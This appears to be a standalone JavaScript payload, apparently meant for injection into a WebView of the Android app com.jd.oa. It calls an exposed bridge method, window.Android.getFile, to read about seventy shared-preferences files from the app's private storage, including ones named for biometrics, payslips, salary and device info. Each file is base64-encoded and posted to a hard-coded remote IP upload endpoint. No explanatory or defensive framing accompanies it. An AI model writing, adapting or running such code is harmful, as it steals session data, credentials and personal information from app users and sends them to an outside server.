<script>
(async () => {
  const server = "http://120.26.107.38:8082/upload"; // 你的服务器地址

  const fileNames = [
    "3808137dff6648cf.xml", "JdAndroidUUID.xml", "BIOMETRIC_OBJECT.xml", "QV1com.tencent.tbs.qimei.sdk.QimeiSDK471f54c20b9ccc6f.xml",
    "BIOMETRIC_VERSION.xml", "RMonitor_SP.xml", "BUGLY_COMMON_VALUES.xml", "SP_AROUTER_CACHE.xml", "BuglySdkInfos.xml",
    "WebViewChromiumPrefs.xml", "FlutterSharedPreferences.xml", "_bundle_icsp.xml", "IM_QUICK_APP.xml", "android.app.ActivityThread.IDS.xml",
    "JDFlutterModules.xml", "app_locale_config.xml", "JDME.xml", "crashrecord.xml", "JDReactAttendance.xml", "d616403a149025c1.xml",
    "JDReactFeedback.xml", "jd_ma_sdk.xml", "jd_meeting.xml", "jdme__language_info.xml", "jdme_devices_info.xml", "JDReactInvestmentM.xml",
    "JDReactInvoiceClient.xml", "JDReactJDMELibrary.xml", "JDReactJDMESurvey.xml", "JDReactJMEAppGroup.xml", "JDReactJMEFpeTool.xml",
    "JDReactJMERNAPI.xml", "JDReactJMESalary.xml", "JDReactJMETestRN.xml", "JDReactJMETripExpense.xml", "JDReactJMETripExpensePre.xml",
    "JDReactJMEValues.xml", "JDReactJMEVocService.xml", "JDReactJMEcompanyTrip.xml", "JDReactJoySpaceHub.xml", "JDReactOfwTool.xml",
    "JDReactPaySlip.xml", "JDReactPurchaseApproval.xml", "JDReactReimbursementClient.xml", "JDReactSmartBus.xml",
    "JDReactSplitOperationTool.xml", "JDWebCoreConfig.xml", "JS-Storage.xml", "new_b_log_ID_tbsbeacon_com.jd.oa_0M300GVKSH1IMBEK.xml",
    "plugin_setting.xml", "preference_keys.xml", "qb_video_settings.xml", "qm_global_sp.xml", "react_prefrence.xml", "sai.xml",
    "shooter_strategyInfo.xml", "tbs_download_config.xml", "tbs_oat_status.xml", "tbs_preloadx5_check_cfg_file.xml", "tbss.xml",
    "uifa.xml", "x5_lc_settings.xml", "x5_proxy_setting.xml", "jrdy_common_sp.xml", "jrdy_local_jue_sp.xml", "logx_strategyInfo.xml",
    "media_jdma_sharePref.xml", "multi_process.xml"
  ];

  let uploaded = 0;

  for (const file of fileNames) {
    const path = "/data/data/com.jd.oa/shared_prefs/" + file;
    try {
      const base64Data = window.Android.getFile(path);
      if (!base64Data || base64Data.length < 50) {
        console.warn(`⚠️ 空或无效文件：${file}`);
        continue;
      }

      const res = await fetch(server, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: file,
          base64: base64Data
        })
      });

      if (res.ok) {
        uploaded++;
        console.log(`✅ 上传成功：${file} (${uploaded}/${fileNames.length})`);
      } else {
        console.error(`❌ 上传失败：${file}，状态码: ${res.status}`);
      }
    } catch (e) {
      console.error(`❌ 异常上传失败：${file}`, e);
    }
  }

  alert(`✅ 上传完毕，共 ${uploaded} 个文件`);
})();
</script>
